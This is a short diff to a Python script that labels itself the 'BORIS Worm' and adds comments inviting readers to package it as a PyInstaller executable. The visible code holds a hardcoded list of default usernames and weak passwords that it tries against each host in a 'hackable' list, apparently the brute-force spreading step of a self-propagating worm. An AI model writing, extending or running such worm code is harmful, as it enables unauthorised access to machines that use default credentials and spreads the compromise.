@@ -1,3 +1,7 @@
+#BORIS Worm
+#The most boring worm in the world
+#Feel free to modify to work as pyinstalled file
+#Please hack responsibly.
 import socket
 import os
 import sys
@@ -95,7 +99,7 @@ while True:
 """
 
 usernames = ["admin","root","guest"]
-passwords = ["system10","toor","admin","root","guest","password","letmein"]
+passwords = ["toor","admin","root","guest","password","letmein"]
 for host in hackable:
     ag=0
     for password in passwords:
